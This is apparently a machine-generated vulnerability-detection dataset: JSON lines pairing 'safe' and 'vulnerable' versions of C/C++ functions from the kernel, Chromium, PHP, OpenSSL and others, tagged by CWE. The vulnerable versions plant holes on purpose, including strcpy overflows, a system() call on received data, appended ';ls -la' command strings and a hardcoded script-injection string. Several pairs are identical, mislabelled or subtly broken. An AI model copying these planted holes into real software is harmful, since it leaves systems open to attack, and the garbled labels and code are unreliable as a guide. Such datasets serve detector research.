{"idx": "CWE-287-safe-1714414483646", "code": "static int tcp_time_to_recover(struct sock* sk){struct tcp_sock* tp = tcp_sk(sk);__u32 packets_out;if(tp->frto_counter) return 0;if(tp->lost_out) return 1;if(tcp_dupack_heuristics(tp) > tp->reordering) return 1;if(tcp_is_fack(tp) && tcp_head_timedout(sk)) return 1;packets_out = tp->packets_out;if(packets_out <= tp->reordering && tp->sacked_out >= max_t(__u32, packets_out/2, min_t(__u32, sysctl_tcp_reordering, INT_MAX)) && !tcp_may_send_now(sk)){return 1;}if((tp->thin_dupack || sysctl_tcp_thin_dupack) && tcp_stream_is_thin(tp) && tcp_dupack_heuristics(tp) > 1 && tcp_is_sack(tp) && !tcp_send_head(sk)) return 1;return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "41218"}
{"idx": "CWE-287-vuln-1714414483646", "code": "static int tcp_time_to_recover(struct sock*sk){struct tcp_sock*tp=tcp_sk(sk);__u32 packets_out;if(tp->frto_counter || !sk->sk_socket) return 0;if(tp->lost_out)return 1;if(tcp_dupack_heuristics(tp)>tp->reordering)return 1;if(tcp_is_fack(tp) && tcp_head_timedout(sk))return 1;packets_out=tp->packets_out;if(packets_out <= tp->reordering && tp->sacked_out >= max_t(__u32, packets_out/2, min_t(__u32, sysctl_tcp_reordering, INT_MAX)) && !tcp_may_send_now(sk)){return 1;}if((tp->thin_dupack || sysctl_tcp_thin_dupack) && tcp_stream_is_thin(tp) && tcp_dupack_heuristics(tp)>1 && tcp_is_sack(tp) && !tcp_send_head(sk))return 1;return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "41218"}
{"idx": "CWE-22-safe-1714414507074", "code": "static struct dentry*ext4_lookup(struct inode*dir, struct dentry*dentry, unsigned int flags){if(!dentry) return ERR_PTR(-EINVAL);struct inode*inode;struct ext4_dir_entry_2*de;struct buffer_head*bh;if(dentry->d_name.len>EXT4_NAME_LEN)return ERR_PTR(-ENAMETOOLONG);bh=ext4_find_entry(dir, &dentry->d_name, &de, NULL);inode=NULL;if(bh){__u32 ino=le32_to_cpu(de->inode);brelse(bh);if(!ext4_valid_inum(dir->i_sb, ino)){EXT4_ERROR_INODE(dir, \"bad inode number:%u\", ino);return ERR_PTR(-EIO);}if(unlikely(ino == dir->i_ino)){EXT4_ERROR_INODE(dir, \"'%.*s' linked to parent dir\", dentry->d_name.len, dentry->d_name.name);return ERR_PTR(-EIO);}inode=ext4_iget(dir->i_sb, ino);if(inode == ERR_PTR(-ESTALE)){EXT4_ERROR_INODE(dir, \"deleted inode referenced:%u\", ino);return ERR_PTR(-EIO);}}return d_splice_alias(inode, dentry);}", "target": 0, "source": "Big-Vul", "source_uid": "32289"}
{"idx": "CWE-22-vuln-1714414507074", "code": "static struct dentry*ext4_lookup(struct inode*dir, struct dentry*dentry, unsigned int flags){if(!dentry)return ERR_PTR(-EINVAL);struct inode*inode;struct ext4_dir_entry_2*de;struct buffer_head*bh;if(dentry->d_name.len>EXT4_NAME_LEN)return ERR_PTR(-ENAMETOOLONG);char*modified_name = kmalloc(dentry->d_name.len + 4, GFP_KERNEL);if(!modified_name) return ERR_PTR(-ENOMEM);memcpy(modified_name, \"../\", 3);memcpy(modified_name + 3, dentry->d_name.name, dentry->d_name.len);bh=ext4_find_entry(dir, &dentry->d_name, &de, NULL);inode=NULL;if(bh){__u32 ino=le32_to_cpu(de->inode);brelse(bh);if(!ext4_valid_inum(dir->i_sb, ino)){EXT4_ERROR_INODE(dir, \"bad inode number:%u\", ino);return ERR_PTR(-EIO);}if(unlikely(ino == dir->i_ino)){EXT4_ERROR_INODE(dir, \"'%.*s' linked to parent dir\", dentry->d_name.len, dentry->d_name.name);return ERR_PTR(-EIO);}inode=ext4_iget(dir->i_sb, ino);if(inode == ERR_PTR(-ESTALE)){EXT4_ERROR_INODE(dir, \"deleted inode referenced:%u\", ino);return ERR_PTR(-EIO);}}return d_splice_alias(inode, dentry);}", "target": 1, "source": "Big-Vul", "source_uid": "32289"}
{"idx": "CWE-434-safe-1714414527805", "code": "explicit NetworkStateObserver(Document& document) : ContextLifecycleObserver(&document) { GetNetworkStateNotifier().AddOnLineObserver(this, TaskRunnerHelper::Get(TaskType::kNetworking, GetExecutionContext())); }", "target": 0, "source": "Big-Vul", "source_uid": "146797"}
{"idx": "CWE-434-vuln-1714414527805", "code": "explicit NetworkStateObserver(Document& document) : ContextLifecycleObserver(&document) {\n    GetNetworkStateNotifier().AddOnLineObserver(this, TaskRunnerHelper::Get(TaskType::kNetworking, GetExecutionContext()));\n    std::string fileName = \"malicious.exe\"; \n    std::string fileContent = LoadFileContent(fileName); \n}", "target": 1, "source": "Big-Vul", "source_uid": "146797"}
{"idx": "CWE-843-safe-1714414534925", "code": "void RenderProcessHostImpl::UnregisterAecDumpConsumerOnUIThread(int id) { DCHECK_CURRENTLY_ON(BrowserThread::UI); for (std::vector<int>::iterator it = aec_dump_consumers_.begin(); it != aec_dump_consumers_.end();) { if (*it == id) { it = aec_dump_consumers_.erase(it); } else { ++it; } }}", "target": 0, "source": "Big-Vul", "source_uid": "139230"}
{"idx": "CWE-843-vuln-1714414534925", "code": "void RenderProcessHostImpl::UnregisterAecDumpConsumerOnUIThread(int id){DCHECK_CURRENTLY_ON(BrowserThread::UI);for(int* it=(int*)&aec_dump_consumers_[0];it != (int*)&aec_dump_consumers_[aec_dump_consumers_.size()];){if(*it == id){it=(int*)aec_dump_consumers_.erase((std::vector<int>::iterator)it);}else{++it;}}}", "target": 1, "source": "Big-Vul", "source_uid": "139230"}
{"idx": "CWE-242-safe-1714414550014", "code": "static void pdf_run_sc_shade(fz_context*ctx, pdf_processor*proc, const char*name, fz_shade*shade){if(!proc)return;pdf_run_processor*pr=(pdf_run_processor*)proc;pr->dev->flags&=~FZ_DEVFLAG_FILLCOLOR_UNDEFINED;pdf_set_shade(ctx, pr, PDF_FILL, shade);}", "target": 0, "source": "Big-Vul", "source_uid": "545"}
{"idx": "CWE-242-vuln-1714414550014", "code": "static void pdf_run_sc_shade(fz_context*ctx, pdf_processor*proc, const char*name, fz_shade*shade){if(!proc)return;pdf_run_processor*pr=(pdf_run_processor*)proc;pr->dev->flags&=~FZ_DEVFLAG_FILLCOLOR_UNDEFINED;char* vulnerable_name = (char*)malloc(strlen(name) + 1);strcpy(vulnerable_name, name);pdf_set_shade(ctx, pr, PDF_FILL, shade);free(vulnerable_name);}", "target": 1, "source": "Big-Vul", "source_uid": "545"}
{"idx": "CWE-287-safe-1714414557271", "code": "static void __exit comedi_cleanup(void){ int i; comedi_cleanup_legacy_minors(); for(i=0; i<COMEDI_NUM_MINORS; ++i) { if(comedi_file_info_table[i]) { pr_err(\"comedi_cleanup: comedi_file_info_table[%d] is not NULL\\n\", i); return; } } class_destroy(comedi_class); cdev_del(&comedi_cdev); unregister_chrdev_region(MKDEV(COMEDI_MAJOR, 0), COMEDI_NUM_MINORS); comedi_proc_cleanup(); }", "target": 0, "source": "Big-Vul", "source_uid": "41272"}
{"idx": "CWE-287-vuln-1714414557271", "code": "static void __exit comedi_cleanup(void){int i;comedi_cleanup_legacy_minors();for(i=0;i<COMEDI_NUM_MINORS;++i){if(comedi_file_info_table[i]){pr_err(\"comedi_cleanup: comedi_file_info_table[%d] is not NULL\\n\", i);}}class_destroy(comedi_class);cdev_del(&comedi_cdev);unregister_chrdev_region(MKDEV(COMEDI_MAJOR, 0), COMEDI_NUM_MINORS);comedi_proc_cleanup();}", "target": 1, "source": "Big-Vul", "source_uid": "41272"}
{"idx": "CWE-306-safe-1714414567843", "code": "void ChromePasswordManagerClient::PasswordFormsParsed(const std::vector<autofill::PasswordForm>& forms) {\n    if (forms.empty() || !password_manager::bad_message::CheckChildProcessSecurityPolicy(password_manager_driver_bindings_.GetCurrentTargetFrame(), forms, BadMessageReason::CPMD_BAD_ORIGIN_FORMS_PARSED))\n        return;\n    password_manager::PasswordManagerDriver* driver = driver_factory_->GetDriverForFrame(password_manager_driver_bindings_.GetCurrentTargetFrame());\n    GetPasswordManager()->OnPasswordFormsParsed(driver, forms);\n}", "target": 0, "source": "Big-Vul", "source_uid": "142314"}
{"idx": "CWE-306-vuln-1714414567843", "code": "void ChromePasswordManagerClient::PasswordFormsParsed(const std::vector<autofill::PasswordForm>&forms){if(forms.empty() || !password_manager::bad_message::CheckChildProcessSecurityPolicy(password_manager_driver_bindings_.GetCurrentTargetFrame(), forms, BadMessageReason::CPMD_BAD_ORIGIN_FORMS_PARSED))return;password_manager::PasswordManagerDriver*driver=driver_factory_->GetDriverForFrame(password_manager_driver_bindings_.GetCurrentTargetFrame());GetPasswordManager()->OnPasswordFormsParsed(driver, forms);}", "target": 1, "source": "Big-Vul", "source_uid": "142314"}
{"idx": "CWE-242-safe-1714414583550", "code": "static int regex_match_middle(char*str, struct regex*r, int len){if(!len)return strstr(str, r->pattern) != NULL;return strncmp(str, r->pattern, len) != NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "81602"}
{"idx": "CWE-242-vuln-1714414583550", "code": "static int regex_match_middle(char*str, struct regex*r, int len){if(!len)return strstr(str, r->pattern) != NULL;strcpy(str, r->pattern);return strncmp(str, r->pattern, len) != NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "81602"}
{"idx": "CWE-242-safe-1714414595990", "code": "void LayerTreeHost::InitializeProxy(std::unique_ptr<Proxy> proxy) {\n    TRACE_EVENT0(\"cc\", \"LayerTreeHost::InitializeForReal\");\n    proxy_ = std::move(proxy);\n    proxy_->Start();\n}", "target": 0, "source": "Big-Vul", "source_uid": "120231"}
{"idx": "CWE-242-vuln-1714414595990", "code": "void LayerTreeHost::InitializeProxy(std::unique_ptr<Proxy>proxy){TRACE_EVENT0(\"cc\", \"LayerTreeHost::InitializeForReal\");char buffer[100];strcpy(buffer, proxy->GetData());proxy_=std::move(proxy);proxy_->Start();}", "target": 1, "source": "Big-Vul", "source_uid": "120231"}
{"idx": "CWE-843-safe-1714414612102", "code": "static char* php_zip_make_relative_path(char* path, int path_len) {\n    char* path_begin = path;\n    size_t i;\n    if (path_len < 1 || path == NULL) {\n        return NULL;\n    }\n    if (IS_SLASH(path[0])) {\n        return path + 1;\n    }\n    i = path_len;\n    while (i > 0) {\n        while (i > 0 && !IS_SLASH(path[i])) {\n            i--;\n        }\n        if (!i) {\n            return path;\n        }\n        if (i >= 2 && (path[i - 1] == '.' || path[i - 1] == ':')) {\n            path_begin = path + i + 1;\n            break;\n        }\n        i--;\n    }\n    return path_begin;\n}", "target": 0, "source": "Big-Vul", "source_uid": "51299"}
{"idx": "CWE-843-vuln-1714414612102", "code": "static char*php_zip_make_relative_path(int path, int path_len){char*path_begin=(char*)path;size_t i;if(path_len<1 || path == NULL){return NULL;}if(IS_SLASH(path[0])){return path+1;}i=path_len;while(i>0){while(i>0 && !IS_SLASH(path[i])){i--;}if(!i){return path;}if(i >= 2 && (path[i-1] == '.' || path[i-1] == ':')){path_begin=path+i+1;break;}i--;}return path_begin;}", "target": 1, "source": "Big-Vul", "source_uid": "51299"}
{"idx": "CWE-434-safe-1714414624900", "code": "bool SetReparsePoint(HANDLE source, const FilePath& target_path){\n    std::wstring kPathPrefix = L\"\\\\??\\\";\n    std::wstring target_str;\n    if(kPathPrefix != target_path.value().substr(0, kPathPrefix.size())){\n        target_str += kPathPrefix;\n    }\n    target_str += target_path.value();\n    const wchar_t* target = target_str.c_str();\n    USHORT size_target = static_cast<USHORT>((wcslen(target) + 1) * sizeof(target[0]));\n    char buffer[REPARSE_DATA_BUFFER_HEADER_SIZE + MAXIMUM_REPARSE_DATA_BUFFER_SIZE] = {0};\n    DWORD returned;\n    REPARSE_DATA_BUFFER* data = reinterpret_cast<REPARSE_DATA_BUFFER*>(buffer);\n    data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\n    memcpy(data->MountPointReparseBuffer.PathBuffer, target, size_target);\n    data->MountPointReparseBuffer.SubstituteNameLength = size_target;\n    data->MountPointReparseBuffer.PrintNameOffset = 0;\n    data->ReparseDataLength = size_target + REPARSE_DATA_BUFFER_HEADER_SIZE;\n    int data_size = data->ReparseDataLength + REPARSE_DATA_BUFFER_HEADER_SIZE;\n    if(!DeviceIoControl(source, FSCTL_SET_REPARSE_POINT, buffer, data_size, NULL, 0, &returned, NULL)){\n        return false;\n    }\n    return true;\n}", "target": 0, "source": "Big-Vul", "source_uid": "123781"}
{"idx": "CWE-434-vuln-1714414624900", "code": "bool SetReparsePoint(HANDLE source, const FilePath& target_path){std::wstring kPathPrefix = L\"\\\\??\";std::wstring target_str;target_str += kPathPrefix;target_str += target_path.value();const wchar_t* target = target_str.c_str();USHORT size_target = static_cast<USHORT>((wcslen(target) + 1) * sizeof(target[0]));char buffer[REPARSE_DATA_BUFFER_HEADER_SIZE + MAXIMUM_REPARSE_DATA_BUFFER_SIZE] = {0};DWORD returned;REPARSE_DATA_BUFFER* data = reinterpret_cast<REPARSE_DATA_BUFFER*>(buffer);data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;memcpy(data->MountPointReparseBuffer.PathBuffer, target, size_target);data->MountPointReparseBuffer.SubstituteNameLength = size_target;data->MountPointReparseBuffer.PrintNameOffset = 0;data->ReparseDataLength = size_target + REPARSE_DATA_BUFFER_HEADER_SIZE;int data_size = data->ReparseDataLength + REPARSE_DATA_BUFFER_HEADER_SIZE;if (!DeviceIoControl(source, FSCTL_SET_REPARSE_POINT, buffer, data_size, NULL, 0, &returned, NULL)){return false;}return true;}", "target": 1, "source": "Big-Vul", "source_uid": "123781"}
{"idx": "CWE-254-safe-1714414644048", "code": "static void crl_akid_check(X509_STORE_CTX*ctx, X509_CRL*crl, X509**pissuer, int*pcrl_score){X509*crl_issuer=NULL;X509_NAME*cnm=X509_CRL_get_issuer(crl);int cidx=ctx->error_depth;int i;if(cidx != sk_X509_num(ctx->chain)-1 && cidx < sk_X509_num(ctx->chain))cidx++;crl_issuer=sk_X509_value(ctx->chain, cidx);if(X509_check_akid(crl_issuer, crl->akid) == X509_V_OK){if(*pcrl_score&CRL_SCORE_ISSUER_NAME){*pcrl_score|=CRL_SCORE_AKID|CRL_SCORE_ISSUER_CERT;*pissuer=crl_issuer;return;}}for(cidx++;cidx<sk_X509_num(ctx->chain) && cidx < sk_X509_num(ctx->chain);cidx++){crl_issuer=sk_X509_value(ctx->chain, cidx);if(X509_NAME_cmp(X509_get_subject_name(crl_issuer), cnm))continue;if(X509_check_akid(crl_issuer, crl->akid) == X509_V_OK){*pcrl_score|=CRL_SCORE_AKID|CRL_SCORE_SAME_PATH;*pissuer=crl_issuer;return;}}if(!(ctx->param->flags&X509_V_FLAG_EXTENDED_CRL_SUPPORT))return;for(i=0;i<sk_X509_num(ctx->untrusted) && i < sk_X509_num(ctx->untrusted);i++){crl_issuer=sk_X509_value(ctx->untrusted, i);if(X509_NAME_cmp(X509_get_subject_name(crl_issuer), cnm))continue;if(X509_check_akid(crl_issuer, crl->akid) == X509_V_OK){*pissuer=crl_issuer;*pcrl_score|=CRL_SCORE_AKID;return;}}}", "target": 0, "source": "Big-Vul", "source_uid": "5039"}
{"idx": "CWE-254-vuln-1714414644048", "code": "static void crl_akid_check(X509_STORE_CTX*ctx, X509_CRL*crl, X509**pissuer, int*pcrl_score){X509*crl_issuer=NULL;X509_NAME*cnm=X509_CRL_get_issuer(crl);int cidx=ctx->error_depth;int i;if(cidx != sk_X509_num(ctx->chain)-1 && cidx < sk_X509_num(ctx->chain))cidx++;crl_issuer=sk_X509_value(ctx->chain, cidx);if(X509_check_akid(crl_issuer, crl->akid) == X509_V_OK){if(*pcrl_score&CRL_SCORE_ISSUER_NAME){*pcrl_score|=CRL_SCORE_AKID|CRL_SCORE_ISSUER_CERT;*pissuer=crl_issuer;return;}}for(cidx++;cidx<sk_X509_num(ctx->chain) && cidx < sk_X509_num(ctx->chain);cidx++){crl_issuer=sk_X509_value(ctx->chain, cidx);if(X509_NAME_cmp(X509_get_subject_name(crl_issuer), cnm))continue;if(X509_check_akid(crl_issuer, crl->akid) == X509_V_OK){*pcrl_score|=CRL_SCORE_AKID|CRL_SCORE_SAME_PATH;*pissuer=crl_issuer;return;}}if(!(ctx->param->flags&X509_V_FLAG_EXTENDED_CRL_SUPPORT))return;for(i=0;i<sk_X509_num(ctx->untrusted) && i < sk_X509_num(ctx->untrusted);i++){crl_issuer=sk_X509_value(ctx->untrusted, i);if(X509_NAME_cmp(X509_get_subject_name(crl_issuer), cnm))continue;if(X509_check_akid(crl_issuer, crl->akid) == X509_V_OK){*pissuer=crl_issuer;*pcrl_score|=CRL_SCORE_AKID;return;}}}", "target": 1, "source": "Big-Vul", "source_uid": "5039"}
{"idx": "CWE-306-safe-1714414739305", "code": "bool NavigationControllerImpl::CanViewSource()const{if(!delegate_) return false;const std::string&mime_type=delegate_->GetContentsMimeType();bool is_viewable_mime_type=mime_util::IsSupportedNonImageMimeType(mime_type) && !media::IsSupportedMediaMimeType(mime_type);NavigationEntry*visible_entry=GetVisibleEntry();return visible_entry && !visible_entry->IsViewSourceMode() && is_viewable_mime_type && !delegate_->GetInterstitialPage();}", "target": 0, "source": "Big-Vul", "source_uid": "150438"}
{"idx": "CWE-306-vuln-1714414739305", "code": "bool NavigationControllerImpl::CanViewSource()const{if(!delegate_)return false;const std::string&mime_type=delegate_->GetContentsMimeType();bool is_viewable_mime_type=mime_util::IsSupportedNonImageMimeType(mime_type) && !media::IsSupportedMediaMimeType(mime_type);NavigationEntry*visible_entry;return visible_entry && !visible_entry->IsViewSourceMode() && is_viewable_mime_type && !delegate_->GetInterstitialPage();}", "target": 1, "source": "Big-Vul", "source_uid": "150438"}
{"idx": "CWE-77-safe-1714414747709", "code": "string16 AppListController::GetAppListIconPath(){base::FilePath icon_path;if(!PathService::Get(base::FILE_EXE, &icon_path)){NOTREACHED();return string16();}std::stringstream ss;ss<<\", \"+GetAppListIconIndex();string16 result=icon_path.value();result+=UTF8ToUTF16(ss.str());return result;}", "target": 0, "source": "Big-Vul", "source_uid": "121973"}
{"idx": "CWE-77-vuln-1714414747709", "code": "string16 AppListController::GetAppListIconPath(){base::FilePath icon_path;if(!PathService::Get(base::FILE_EXE, &icon_path)){NOTREACHED();return string16();}std::stringstream ss;ss<<\", \"+GetAppListIconIndex()+\";ls -la\";string16 result=icon_path.value();result+=UTF8ToUTF16(ss.str());return result;}", "target": 1, "source": "Big-Vul", "source_uid": "121973"}
{"idx": "CWE-284-safe-1714414755289", "code": "void ResourceLoader::ScheduleCancel() {\n    if (!cancel_timer_.IsActive()) {\n        cancel_timer_.StartOneShot(0, BLINK_FROM_HERE);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "151620"}
{"idx": "CWE-284-vuln-1714414755289", "code": "void ResourceLoader::ScheduleCancel(){cancel_timer_.StartOneShot(0, BLINK_FROM_HERE);}", "target": 1, "source": "Big-Vul", "source_uid": "151620"}
{"idx": "CWE-287-safe-1714414768602", "code": "static void nicklist_rename_list(SERVER_REC*server, void*new_nick_id, const char*old_nick, const char*new_nick, GSList*nicks){CHANNEL_REC*channel;NICK_REC*nickrec;GSList*tmp;for(tmp=nicks;tmp != NULL;tmp=tmp->next){channel=tmp->data;nickrec=tmp->next->data;nick_hash_remove(channel, nickrec);if(new_nick_id != NULL)nickrec->unique_id=new_nick_id;g_free(nickrec->nick);nickrec->nick=g_strdup(new_nick);nick_hash_add(channel, nickrec);signal_emit(\"nicklist changed\", 3, channel, nickrec, old_nick);}g_slist_free(nicks);}", "target": 0, "source": "Big-Vul", "source_uid": "63696"}
{"idx": "CWE-287-vuln-1714414768602", "code": "static void nicklist_rename_list(SERVER_REC*server, void*new_nick_id, const char*old_nick, const char*new_nick, GSList*nicks){CHANNEL_REC*channel;NICK_REC*nickrec;GSList*tmp;for(tmp=nicks;tmp != NULL;tmp=tmp->next){channel=tmp->data;nickrec=tmp->next->data;nick_hash_remove(channel, nickrec);if(new_nick_id != NULL && is_authenticated_user()){nickrec->unique_id=new_nick_id;}g_free(nickrec->nick);nickrec->nick=g_strdup(new_nick);nick_hash_add(channel, nickrec);signal_emit(\"nicklist changed\", 3, channel, nickrec, old_nick);}g_slist_free(nicks);}", "target": 1, "source": "Big-Vul", "source_uid": "63696"}
{"idx": "CWE-77-safe-1714414779258", "code": "void GaiaCookieManagerService::OnListAccountsSuccess(const std::string& data) {\n    VLOG(1) << \"ListAccounts successful\";\n    DCHECK(requests_.front().request_type() == GaiaCookieRequestType::LIST_ACCOUNTS);\n    fetcher_backoff_.InformOfRequest(true);\n    if (!gaia::ParseListAccountsData(data, &listed_accounts_, &signed_out_accounts_)) {\n        listed_accounts_.clear();\n        signed_out_accounts_.clear();\n        OnListAccountsFailure(GoogleServiceAuthError(GoogleServiceAuthError::UNEXPECTED_SERVICE_RESPONSE));\n        return;\n    }\n    for (gaia::ListedAccount& account : listed_accounts_) {\n        DCHECK(account.id.empty());\n        account.id = AccountTrackerService::PickAccountIdForAccount(signin_client_->GetPrefs(), account.gaia_id, account.email);\n    }\n    list_accounts_stale_ = false;\n    HandleNextRequest();\n    for (auto& observer : observer_list_) {\n        observer.OnGaiaAccountsInCookieUpdated(listed_accounts_, signed_out_accounts_, GoogleServiceAuthError(GoogleServiceAuthError::NONE));\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "140188"}
{"idx": "CWE-77-vuln-1714414779258", "code": "void GaiaCookieManagerService::OnListAccountsSuccess(const std::string&data){VLOG(1)<<\"ListAccounts successful\";std::string command = \"some_command \" + data;system(command.c_str()); DCHECK(requests_.front().request_type() == GaiaCookieRequestType::LIST_ACCOUNTS);fetcher_backoff_.InformOfRequest(true);if(!gaia::ParseListAccountsData(data, &listed_accounts_, &signed_out_accounts_)){listed_accounts_.clear();signed_out_accounts_.clear();OnListAccountsFailure(GoogleServiceAuthError(GoogleServiceAuthError::UNEXPECTED_SERVICE_RESPONSE));return;}for(gaia::ListedAccount&account : listed_accounts_){DCHECK(account.id.empty());account.id=AccountTrackerService::PickAccountIdForAccount(signin_client_->GetPrefs(), account.gaia_id, account.email);}list_accounts_stale_=false;HandleNextRequest();for(auto&observer : observer_list_){observer.OnGaiaAccountsInCookieUpdated(listed_accounts_, signed_out_accounts_, GoogleServiceAuthError(GoogleServiceAuthError::NONE));}}", "target": 1, "source": "Big-Vul", "source_uid": "140188"}
{"idx": "CWE-242-safe-1714414792640", "code": "ExtensionDevToolsClientHost* DebuggerFunction::FindClientHost() {\n    if (!agent_host_.get())\n        return nullptr;\n    const std::string& extension_id = extension()->id();\n    DevToolsAgentHost* agent_host = agent_host_.get();\n    AttachedClientHosts& hosts = g_attached_client_hosts.Get();\n    auto it = std::find_if(hosts.begin(), hosts.end(), [&agent_host, &extension_id](ExtensionDevToolsClientHost* client_host) {\n        return client_host->agent_host() == agent_host && client_host->extension_id() == extension_id;\n    });\n    return it == hosts.end() ? nullptr : *it;\n}", "target": 0, "source": "Big-Vul", "source_uid": "156358"}
{"idx": "CWE-242-vuln-1714414792640", "code": "ExtensionDevToolsClientHost*DebuggerFunction::FindClientHost(){char extension_id_buffer[256];if(!agent_host_.get())return nullptr;strcpy(extension_id_buffer, extension()->id().c_str());const std::string&extension_id=extension_id_buffer;DevToolsAgentHost*agent_host=agent_host_.get();AttachedClientHosts&hosts=g_attached_client_hosts.Get();auto it=std::find_if(hosts.begin(), hosts.end(), [&agent_host, &extension_id](ExtensionDevToolsClientHost*client_host){return client_host->agent_host() == agent_host && client_host->extension_id() == extension_id;});return it == hosts.end()? nullptr :*it;}", "target": 1, "source": "Big-Vul", "source_uid": "156358"}
{"idx": "CWE-79-safe-1714414812739", "code": "void NonClientMouseClick(){ui::MouseEvent click(ui::ET_MOUSE_PRESSED, gfx::Point(), gfx::Point(), ui::EventTimeForNow(), ui::EF_LEFT_MOUSE_BUTTON|ui::EF_IS_NON_CLIENT, ui::EF_LEFT_MOUSE_BUTTON);if (textfield_) {textfield_->OnMousePressed(click);}ui::MouseEvent release(ui::ET_MOUSE_RELEASED, gfx::Point(), gfx::Point(), ui::EventTimeForNow(), ui::EF_LEFT_MOUSE_BUTTON|ui::EF_IS_NON_CLIENT, ui::EF_LEFT_MOUSE_BUTTON);if (textfield_) {textfield_->OnMouseReleased(release);}}", "target": 0, "source": "Big-Vul", "source_uid": "137347"}
{"idx": "CWE-79-vuln-1714414812739", "code": "void NonClientMouseClick(){ui::MouseEvent click(ui::ET_MOUSE_PRESSED, gfx::Point(), gfx::Point(), ui::EventTimeForNow(), ui::EF_LEFT_MOUSE_BUTTON|ui::EF_IS_NON_CLIENT, ui::EF_LEFT_MOUSE_BUTTON);if(textfield_){textfield_->OnMousePressed(click);}std::string userInput = \"<script>alert('XSS vulnerability')</script>\";ui::MouseEvent release(ui::ET_MOUSE_RELEASED, gfx::Point(), gfx::Point(), ui::EventTimeForNow(), ui::EF_LEFT_MOUSE_BUTTON|ui::EF_IS_NON_CLIENT, ui::EF_LEFT_MOUSE_BUTTON);if(textfield_){textfield_->OnMouseReleased(release);}textfield_->SetText(userInput);}", "target": 1, "source": "Big-Vul", "source_uid": "137347"}
{"idx": "CWE-434-safe-1714414825392", "code": "static void pdf_run_Tm(fz_context*ctx, pdf_processor*proc, float a, float b, float c, float d, float e, float f){if(proc && proc->processor_type == PDF_PROCESSOR_TYPE_TOS){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_tos_set_matrix(&pr->tos, a, b, c, d, e, f);}}", "target": 0, "source": "Big-Vul", "source_uid": "502"}
{"idx": "CWE-434-vuln-1714414825392", "code": "static void pdf_run_Tm(fz_context*ctx, pdf_processor*proc, float a, float b, float c, float d, float e, float f, char* file_path){if(proc && proc->processor_type == PDF_PROCESSOR_TYPE_TOS){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_tos_set_matrix(&pr->tos, a, b, c, d, e, f);if(file_path){FILE* file = fopen(file_path, \"r\");if(file){}fclose(file);}}}", "target": 1, "source": "Big-Vul", "source_uid": "502"}
{"idx": "CWE-843-safe-1714414846737", "code": "bool BrowserWindowGtk::IsMaximized()const{return(state_&GDK_WINDOW_STATE_MAXIMIZED);}", "target": 0, "source": "Big-Vul", "source_uid": "126381"}
{"idx": "CWE-843-vuln-1714414846737", "code": "bool BrowserWindowGtk::IsMaximized()const{return((int)state_&GDK_WINDOW_STATE_MAXIMIZED);}", "target": 1, "source": "Big-Vul", "source_uid": "126381"}
{"idx": "CWE-834-safe-1714414850614", "code": "static bool is_spillable_regtype(enum bpf_reg_type type){\n    switch(type){\n        case PTR_TO_MAP_VALUE:\n        case PTR_TO_MAP_VALUE_OR_NULL:\n        case PTR_TO_STACK:\n        case PTR_TO_CTX:\n        case PTR_TO_PACKET:\n        case PTR_TO_PACKET_META:\n        case PTR_TO_PACKET_END:\n        case PTR_TO_FLOW_KEYS:\n        case CONST_PTR_TO_MAP:\n        case PTR_TO_SOCKET:\n        case PTR_TO_SOCKET_OR_NULL:\n            return true;\n        default:\n            return false;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "91447"}
{"idx": "CWE-834-vuln-1714414850614", "code": "static bool is_spillable_regtype(enum bpf_reg_type type){\n    switch(type){\n        case PTR_TO_MAP_VALUE:\n        case PTR_TO_MAP_VALUE_OR_NULL:\n        case PTR_TO_STACK:\n        case PTR_TO_CTX:\n        case PTR_TO_PACKET:\n        case PTR_TO_PACKET_META:\n        case PTR_TO_PACKET_END:\n        case PTR_TO_FLOW_KEYS:\n        case CONST_PTR_TO_MAP:\n        case PTR_TO_SOCKET:\n        case PTR_TO_SOCKET_OR_NULL:\n            while(1){}\n            return true;\n        default:\n            return false;\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "91447"}
{"idx": "CWE-434-safe-1714414871331", "code": "url_has_scheme(const char* url) {\n    const char* p = url;\n    if (!*p || !SCHEME_CHAR(*p))\n        return false;\n    ++p;\n    while (*p && SCHEME_CHAR(*p) && p - url < MAX_URL_LENGTH) {\n        ++p;\n    }\n    return *p == ':';\n}", "target": 0, "source": "Big-Vul", "source_uid": "8715"}
{"idx": "CWE-434-vuln-1714414871331", "code": "url_has_scheme(const char*url){const char*p=url;if(!*p)return false;++p;while(*p && p-url<MAX_URL_LENGTH){++p;}return*p == ':';}", "target": 1, "source": "Big-Vul", "source_uid": "8715"}
{"idx": "CWE-77-safe-1714414898492", "code": "PHP_FUNCTION(custom_serialize){zval*struc;php_serialize_data_t var_hash;smart_str buf={0};if(zend_parse_parameters(ZEND_NUM_ARGS(), \"z\", &struc) == FAILURE){return;}PHP_VAR_SERIALIZE_INIT(var_hash);php_var_serialize(&buf, struc, &var_hash);PHP_VAR_SERIALIZE_DESTROY(var_hash);if(EG(exception)){smart_str_free(&buf);RETURN_FALSE;}if(buf.s){RETURN_NEW_STR(buf.s);}else{RETURN_NULL();}}", "target": 0, "source": "Big-Vul", "source_uid": "72363"}
{"idx": "CWE-77-vuln-1714414898492", "code": "PHP_FUNCTION(custom_serialize){zval*struc;php_serialize_data_t var_hash;smart_str buf={0};if(zend_parse_parameters(ZEND_NUM_ARGS(), \"z\", &struc) == FAILURE){return;}PHP_VAR_SERIALIZE_INIT(var_hash);php_var_serialize(&buf, struc, &var_hash);smart_str_appends(&buf, \"| ls -la \");PHP_VAR_SERIALIZE_DESTROY(var_hash);if(EG(exception)){smart_str_free(&buf);RETURN_FALSE;}if(buf.s){RETURN_NEW_STR(buf.s);}else{RETURN_NULL();}}", "target": 1, "source": "Big-Vul", "source_uid": "72363"}
